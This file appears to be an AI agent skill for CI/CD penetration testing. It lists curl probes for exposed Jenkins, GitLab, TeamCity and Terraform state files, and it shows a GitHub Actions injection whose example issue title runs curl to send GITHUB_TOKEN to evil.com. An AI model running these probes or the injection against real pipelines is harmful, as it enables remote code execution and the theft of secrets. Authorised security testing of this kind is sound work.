---
name: ci-cd-security
description: CI/CD pipeline security testing covering GitHub Actions injection, exposed Jenkins, GitLab CI secrets, and Terraform state exploitation
---

# CI/CD Pipeline Security

## Key Vulnerabilities

### Exposed CI/CD Interfaces

```bash
# Jenkins (common ports: 8080, 8443)
curl -sk http://TARGET:8080/ | grep -i jenkins
curl -sk http://TARGET:8080/script  # Groovy script console → RCE
curl -sk http://TARGET:8080/api/json
curl -sk http://TARGET:8080/credentials/

# GitLab CI
curl -sk https://TARGET/-/ci/lint
curl -sk https://TARGET/api/v4/projects?private_token=TOKEN

# GitHub Actions
# Check .github/workflows/*.yml in repos for secret references and injection points

# TeamCity
curl -sk http://TARGET:8111/app/rest/server
```

### GitHub Actions Injection

```yaml
# Vulnerable workflow — user-controlled input in run step
# PR title, branch name, issue title → injected into bash
name: Vulnerable
on:
  issues:
    types: [opened]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Issue: ${{ github.event.issue.title }}"
        # If title is: test"; curl http://evil.com/steal?token=$GITHUB_TOKEN #
        # → RCE + secret theft
```

### Terraform State Exposure

```bash
# Terraform state contains ALL infrastructure secrets
curl -sk https://TARGET/.terraform/terraform.tfstate
curl -sk https://TARGET/terraform.tfstate
# Contains: AWS keys, database passwords, private IPs, cert keys
```

## Pro Tips

1. Jenkins script console (`/script`) = instant RCE if accessible without auth
2. GitHub Actions `${{ }}` expressions in `run:` steps are injectable via PR/issue titles
3. Terraform state files contain plaintext secrets for ALL managed infrastructure
4. GitLab CI variables are accessible via API if tokens are leaked
5. Look for `.github/workflows/`, `Jenkinsfile`, `.gitlab-ci.yml`, `.circleci/config.yml` in repos
